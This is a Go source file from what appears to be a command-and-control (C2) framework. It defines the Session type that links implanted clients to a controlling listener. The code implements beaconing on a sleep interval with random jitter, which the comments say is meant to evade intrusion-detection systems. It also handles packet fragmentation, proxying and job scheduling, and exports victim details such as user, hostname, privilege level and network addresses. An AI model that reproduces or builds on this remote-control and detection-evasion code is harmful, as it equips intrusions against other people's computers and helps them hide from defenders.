package c2

import (
	"context"
	"io"
	"net"
	"strconv"
	"sync/atomic"
	"time"

	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/com/limits"
	"github.com/iDigitalFlame/xmt/data"
	"github.com/iDigitalFlame/xmt/device"
	"github.com/iDigitalFlame/xmt/util"
	"github.com/iDigitalFlame/xmt/util/xerr"
)

const maxErrors = 2

var (
	// ErrUnable is an error returned for a generic action if there is some condition that prevents the action
	// from running.
	ErrUnable = xerr.New("cannot preform this action")
	// ErrFullBuffer is returned from the WritePacket function when the send buffer for Session is full.
	ErrFullBuffer = xerr.New("cannot add a Packet to a full send buffer")
)

// Session is a struct that represents a connection between the client and the Listener. This struct does some
// automatic handeling and acts as the communication channel between the client and server.
type Session struct {
	Device device.Machine
	connection

	Last    time.Time
	Created time.Time
	ID      device.ID

	host  string
	sleep time.Duration

	ch     chan waker
	socket func(string) (net.Conn, error)

	peek *com.Packet
	send chan *com.Packet

	Receive func(*Session, *com.Packet)

	wake   chan waker
	parent *Listener
	frags  map[uint16]*cluster
	swarm  *proxySwarm

	Shutdown func(*Session)

	recv    chan *com.Packet
	done    uint32
	mode    uint32
	channel uint32

	jitter uint8
	errors uint8
}
type cluster struct {
	max  uint16
	data []*com.Packet
}

// Wait will block until the current Session is closed and shutdown.
func (s *Session) Wait() {
	<-s.ch
}
func (s *Session) wait() {
	if s.sleep == 0 || atomic.LoadUint32(&s.done) > flagOpen {
		return
	}
	w := s.sleep
	if s.jitter > 0 && s.jitter <= 100 {
		if (s.jitter == 100 || uint8(util.FastRandN(100)) < s.jitter) && w > time.Millisecond {
			d := util.Rand.Int63n(int64(w / time.Millisecond))
			if util.FastRandN(2) == 1 {
				d = d * -1
			}
			w += (time.Duration(d) * time.Millisecond)
			if w < 0 {
				w = time.Duration(w * -1)
			}
		}
	}
	x, c := context.WithTimeout(context.Background(), w)
	select {
	case <-s.wake:
		break
	case <-x.Done():
		break
	case <-s.ctx.Done():
		atomic.StoreUint32(&s.done, flagLast)
		break
	}
	c()
}

// Wake will interrupt the sleep of the current Session thread. This will trigger the send and receive
// functions of this Session. This is not valid for Server side Sessions.
func (s *Session) Wake() {
	if s.wake == nil {
		return
	}
	if len(s.wake) < cap(s.wake) {
		s.wake <- wake
	}
}
func (s *Session) listen() {
	if s.parent != nil {
		atomic.StoreUint32(&s.done, flagClose)
	}
	for s.wait(); atomic.LoadUint32(&s.done) <= flagLast; s.wait() {
		if s.done == flagLast && s.parent == nil {
			if s.parent != nil {
				break
			}
			s.peek = &com.Packet{ID: MvShutdown, Device: s.ID}
			atomic.StoreUint32(&s.mode, 0)
			atomic.StoreUint32(&s.done, flagOption)
			atomic.StoreUint32(&s.channel, flagFinished)
			close(s.send)
		}
		s.log.Trace("[%s] Waking up...", s.ID)
		if s.done == 0 && s.swarm != nil {
			s.swarm.process()
		}
		c, err := s.socket(s.host)
		if err != nil {
			if s.done > 0 {
				break
			}
			s.log.Warning("[%s] Received an error attempting to connect to %q: %s!", s.ID, s.host, err.Error())
			if s.errors < maxErrors {
				s.errors++
				continue
			}
			break
		}
		s.log.Trace("[%s] Connected to %q...", s.ID, s.host)
		for o := false; atomic.LoadUint32(&s.done) <= flagOption; {
			if s.session(c, o) && s.done == flagOpen {
				o = true
				continue
			}
			break
		}
		if c.Close(); s.errors > maxErrors {
			break
		}
		if s.done == flagOption {
			break
		}
		select {
		case <-s.ctx.Done():
			atomic.StoreUint32(&s.done, flagLast)
		default:
		}
	}
	s.log.Trace("[%s] Stopping transaction thread...", s.ID)
	s.shutdown()
}
func (s *Session) shutdown() {
	if s.Shutdown != nil {
		s.s.events <- event{s: s, sFunc: s.Shutdown}
	}
	if s.cancel(); s.swarm != nil {
		s.swarm.Close()
	}
	if s.done < flagOption {
		close(s.send)
	}
	if s.wake != nil {
		close(s.wake)
	}
	close(s.recv)
	atomic.StoreUint32(&s.done, flagFinished)
	if s.parent != nil && atomic.LoadUint32(&s.parent.done) < flagFinished {
		s.parent.close <- s.ID.Hash()
	}
	close(s.ch)
}

// Jitter returns the Jitter percentage value. Values of zero (0) indicate that Jitter is disabled.
func (s Session) Jitter() uint8 {
	return s.jitter
}

// IsProxy returns true when a Proxy has been attached to this Session and is active.
func (s Session) IsProxy() bool {
	return s.swarm != nil
}

// Close stops the listening thread from this Session and releases all associated resources.
func (s *Session) Close() error {
	if atomic.LoadUint32(&s.done) == flagFinished {
		return nil
	}
	atomic.StoreUint32(&s.done, flagLast)
	s.cancel()
	if s.parent == nil {
		s.Wait()
	} else {
		s.shutdown()
	}
	return nil
}

// String returns the details of this Session as a string.
func (s Session) String() string {
	switch {
	case s.parent == nil && s.sleep == 0:
		return "[" + s.ID.String() + "] -> " + s.host + " " + s.Last.Format(time.RFC1123)
	case s.parent == nil && (s.jitter == 0 || s.jitter > 100):
		return "[" + s.ID.String() + "] " + s.sleep.String() + " -> " + s.host
	case s.parent == nil:
		return "[" + s.ID.String() + "] " + s.sleep.String() + "/" + strconv.Itoa(int(s.jitter)) + "% -> " + s.host
	case s.parent != nil && (s.jitter == 0 || s.jitter > 100):
		return "[" + s.ID.String() + "] " + s.sleep.String() + " -> " + s.host + " " + s.Last.Format(time.RFC1123)
	}
	return "[" + s.ID.String() + "] " + s.sleep.String() + "/" + strconv.Itoa(int(s.jitter)) + "% -> " + s.host + " " + s.Last.Format(time.RFC1123)
}

// IsActive returns true if this Session is still able to send and receive Packets.
func (s Session) IsActive() bool {
	return s.done == flagOpen
}

// IsClient returns true when this Session is not associated to a Listener on this end, which signifies that this
// session is Client initiated.
func (s Session) IsClient() bool {
	return s.parent == nil
}

// IsChannel will return true is this Session sets the Channel flag on any Packets that flow this this
// Session, including Proxied clients or if this Session is currently in Channel mode, even if not explicitly set.
func (s Session) IsChannel() bool {
	return s.channel == 1 || s.mode == 1
}

// SetJitter sets Jitter percentage of the Session's wake interval. This is a 0 to 100 percentage (inclusive) that
// will determine any +/- time is added to the waiting period. This assists in evading IDS/NDS devices/systems. A
// value of 0 will disable Jitter and any value over 100 will set the value to 100, which represents using Jitter 100%
// of the time. If this is a Server-side Session, the new value will be sent to the Client in a MvUpdate Packet.
func (s *Session) SetJitter(j int) {
	s.SetDuration(s.sleep, j)
}
func (s *Session) accept(i uint16) {
	if s.parent == nil || s.s == nil || s.s.Scheduler == nil {
		return
	}
	s.s.Scheduler.notifyTask(i)
}

// Read attempts to grab a Packet from the receiving buffer. This function returns nil if the buffer is empty.
func (s *Session) Read() *com.Packet {
	if len(s.recv) > 0 {
		return <-s.recv
	}
	return nil
}
func (c *cluster) done() *com.Packet {
	if uint16(len(c.data)) >= c.max {
		n := c.data[0]
		for x := 1; x < len(c.data); x++ {
			n.Add(c.data[x])
			c.data[x].Clear()
			c.data[x] = nil
		}
		c.data = nil
		n.Flags.Clear()
		return n
	}
	return nil
}

// Next attempts to grab a Packet from the receiving buffer. This function will wait for a Packet while the
// buffer is empty.
func (s *Session) Next() *com.Packet {
	return <-s.recv
}

// SetChannel will disable setting the Channel mode of this Session. If true, every Packet sent will trigger Channel
// mode. This setting does NOT affect the Session enabling Channel mode if a Packet is sent with the Channel Flag
// enabled. Channel is NOT supported by non-statefull connections (UDP/Web/ICMP, etc).
func (s *Session) SetChannel(c bool) {
	if c {
		atomic.StoreUint32(&s.channel, 1)
	} else {
		atomic.StoreUint32(&s.channel, 0)
	}
}

// RemoteAddr returns a string representation of the remotely connected IP address. This could be the IP address of the
// c2 server or the public IP of the client.
func (s Session) RemoteAddr() string {
	return s.host
}
func (s Session) json(w *data.Chunk) {
	w.Write([]byte(`{` +
		`"id":"` + s.ID.FullString() + `",` +
		`"hash":"` + strconv.Itoa(int(s.ID.Hash())) + `",` +
		`"device":{` +
		`"id":"` + s.ID.FullString() + `",` +
		`"signature":"` + s.ID.Signature() + `",` +
		`"user":"` + s.Device.User + `",` +
		`"hostname":"` + s.Device.Hostname + `",` +
		`"version":"` + s.Device.Version + `",` +
		`"arch":"` + s.Device.Arch.String() + `",` +
		`"os":"` + s.Device.OS.String() + `",` +
		`"elevated":"` + strconv.FormatBool(s.Device.Elevated) + `",` +
		`"pid":` + strconv.Itoa(int(s.Device.PID)) + `,` +
		`"ppid":` + strconv.Itoa(int(s.Device.PID)) + `,` +
		`"network":[`,
	))
	for i := range s.Device.Network {
		if i > 0 {
			w.WriteUint8(uint8(','))
		}
		w.Write([]byte(
			`{"name":"` + s.Device.Network[i].Name + `",` +
				`"mac":"` + s.Device.Network[i].Hardware.String() + `","ip":[`,
		))
		for x := range s.Device.Network[i].Address {
			if x > 0 {
				w.WriteUint8(uint8(','))
			}
			w.Write([]byte(`"` + s.Device.Network[i].Address[x].String() + `"`))
		}
		w.Write([]byte("]}"))
	}
	w.Write([]byte(
		`]},` +
			`"created":"` + s.Created.Format(time.RFC3339) + `",` +
			`"last":"` + s.Last.Format(time.RFC3339) + `",` +
			`"via":"` + s.host + `",` +
			`"sleep":` + strconv.Itoa(int(s.sleep)) + `,` +
			`"jitter":` + strconv.Itoa(int(s.jitter)) + `}`,
	))
}

// Time returns the value for the timeout period between C2 Server connections.
func (s Session) Time() time.Duration {
	return s.sleep
}

// Send adds the supplied Packet into the stack to be sent to the server on next wake. This call is asynchronous
// and returns immediately. Unlike 'Write' this function does NOT return an error and will wait if the send buffer is full.
func (s *Session) Send(p *com.Packet) {
	s.write(true, p)
}
func (c *cluster) add(p *com.Packet) error {
	if p == nil || p.Empty() {
		return nil
	}
	if len(c.data) > 0 && !c.data[0].Belongs(p) {
		return xerr.New("packet ID " + strconv.FormatUint(uint64(p.ID), 16) + " does not match combining Packet ID")
	}
	if p.Flags.Len() > c.max {
		c.max = p.Flags.Len()
	}
	c.data = append(c.data, p)
	return nil
}

// SetSleep sets the wake interval period for this Session. This is the time value between connections to the C2
// Server. This does NOT apply to channels. If this is a Server-side Session, the new value will be sent to the
// Client in a MvUpdate Packet. This setting does not affect Jitter.
func (s *Session) SetSleep(t time.Duration) {
	s.SetDuration(t, int(s.jitter))
}

// Context returns the current Session's context. This function can be useful for canceling running processes
// when this Session closes.
func (s *Session) Context() context.Context {
	return s.ctx
}

// Write adds the supplied Packet into the stack to be sent to the server on next wake. This call is
// asynchronous and returns immediately. 'ErrFullBuffer' will be returned if the send buffer is full.
func (s *Session) Write(p *com.Packet) error {
	return s.write(false, p)
}

// MarshalJSON fulfils the JSON Marshaler interface.
func (s Session) MarshalJSON() ([]byte, error) {
	b := buffers.Get().(*data.Chunk)
	s.json(b)
	d := b.Payload()
	returnBuffer(b)
	return d, nil
}

// Packets returns a receive only channel that can be used in a for loop for acting on Packets when they arrive without
// using the Receive function.
func (s *Session) Packets() <-chan *com.Packet {
	return s.recv
}
func (s *Session) session(c net.Conn, o bool) bool {
	p, err := s.next(false)
	if err != nil {
		s.log.Warning("[%s] Received an error retriving the next Packet to %q: %s!", s.ID, s.host, err.Error())
		return false
	}
	var y = o
	switch {
	case atomic.LoadUint32(&s.channel) == 0 && o:
		if s.mode == 1 && p.Flags&com.FlagChannel == 0 {
			break
		}
		fallthrough
	case atomic.LoadUint32(&s.channel) == 1 && !o:
		if !o {
			atomic.StoreUint32(&s.mode, 1)
		} else {
			atomic.StoreUint32(&s.mode, 0)
		}
		y = !o
		p.Flags |= com.FlagChannel
		s.log.Trace("[%s] Setting Channel flag on next Packet to %q!", s.ID, s.host)
	case p.Flags&com.FlagChannel != 0 && o:
		fallthrough
	case p.Flags&com.FlagChannel != 0 && !o:
		if !o {
			atomic.StoreUint32(&s.mode, 1)
		} else {
			atomic.StoreUint32(&s.mode, 0)
		}
		y = !o
		s.log.Trace("[%s] Setting Channel flag on next Packet to %q (set by Packet)!", s.ID, s.host)
	}
	s.log.Trace("[%s] Sending Packet %q to %q.", s.ID, p.String(), s.host)
	if err := writePacket(c, s.w, s.t, p); err != nil {
		s.log.Warning("[%s] Received an error attempting to write to %q: %s!", s.ID, s.host, err.Error())
		return false
	}
	p.Clear()
	if p, err = readPacket(c, s.w, s.t); err != nil {
		s.log.Warning("[%s] Received an error attempting to read from %q: %s!", s.ID, s.host, err.Error())
		s.errors++
		return false
	}
	s.log.Trace("[%s] %s: Received a Packet %q...", s.ID, s.host, p.String())
	if err := notify(s.parent, s, p); err != nil {
		s.log.Warning("[%s] Received an error processing packet data from %q! (%s)", s.ID, s.host, err.Error())
		return false
	}
	s.errors = 0
	return y
}
func (s *Session) next(i bool) (*com.Packet, error) {
	var t []uint32
	if s.swarm != nil && len(s.swarm.clients) > 0 {
		t = s.swarm.tags()
	}
	if s.peek == nil && len(s.send) == 0 {
		if s.parent == nil {
			if atomic.LoadUint32(&s.mode) == 1 {
				s.wait()
			}
			return &com.Packet{ID: MvNop, Device: s.ID, Tags: t}, nil
		}
		if i {
			return nil, nil
		}
		return &com.Packet{ID: MvNop, Device: s.ID, Tags: t}, nil
	}
	var (
		p   *com.Packet
		err error
	)
	if s.peek != nil {
		p, s.peek = s.peek, nil
	} else {
		p = <-s.send
	}
	if len(s.send) == 0 && p.Verify(s.ID) {
		p.Tags = t
		s.accept(p.Job)
		return p, nil
	}
	if p, s.peek, err = nextPacket(s, s.send, p, s.ID); err != nil {
		return nil, err
	}
	p.Tags = t
	return p, nil
}
func (s *Session) write(w bool, p *com.Packet) error {
	if atomic.LoadUint32(&s.done) > flagOpen {
		return io.ErrClosedPipe
	}
	if p.Len() <= limits.FragLimit() {
		if !w && len(s.send)+1 >= cap(s.send) {
			return ErrFullBuffer
		}
		s.send <- p
		if atomic.LoadUint32(&s.mode) == 1 {
			s.Wake()
		}
		return nil
	}
	var m = (p.Len() / limits.FragLimit()) + 1
	if !w && len(s.send)+m >= cap(s.send) {
		return ErrFullBuffer
	}
	var (
		x    = int64(p.Len())
		g    = uint16(util.FastRand())
		f    = atomic.LoadUint32(&s.mode) == 1
		err  error
		t, n int64
	)
	for i := 0; i < m && t < x; i++ {
		c := &com.Packet{ID: p.ID, Job: p.Job, Flags: p.Flags, Chunk: data.Chunk{Limit: limits.FragLimit()}}
		c.Flags.SetGroup(g)
		c.Flags.SetLen(uint16(m))
		c.Flags.SetPosition(uint16(i))
		if n, err = p.WriteTo(c); err != nil && err != data.ErrLimit {
			c.Flags.SetLen(0)
			c.Flags.SetPosition(0)
			c.Flags.Set(com.FlagError)
			return err
		}
		t += n
		s.send <- c
		if f {
			s.Wake()
		}
	}
	return nil
}

// SetDuration sets the wake interval period and Jitter for this Session. This is the time value between
// connections to the C2 Server. This does NOT apply to channels. Jitter is a 0 to 100 percentage (inclusive) that
// will determine any +/- time is added to the waiting period. This assists in evading IDS/NDS devices/systems. A
// value of 0 will disable Jitter and any value over 100 will set the value to 100, which represents using Jitter 100%
// of the time. If this is a Server-side Session, the new value will be sent to the Client in a MvUpdate Packet.
func (s *Session) SetDuration(t time.Duration, j int) {
	switch {
	case j < 0:
		s.jitter = 0
	case j > 100:
		s.jitter = 100
	default:
		s.jitter = uint8(j)
	}
	s.sleep = t
	if s.parent != nil {
		n := &com.Packet{ID: MvUpdate, Device: s.Device.ID}
		n.WriteUint8(s.jitter)
		n.WriteUint64(uint64(s.sleep))
		n.Close()
		s.send <- n
	}
}

// Schedule is a quick alias for the 'Server.Scheduler.Schedule' function that uses this current Session in the
// Session parameter. This function will return a wrapped 'ErrUnable' error if this is a client Session.
func (s *Session) Schedule(p *com.Packet) (*Job, error) {
	if s.parent == nil {
		return nil, xerr.Wrap("cannot be a client session", ErrUnable)
	}
	return s.s.Scheduler.Schedule(s, p)
}
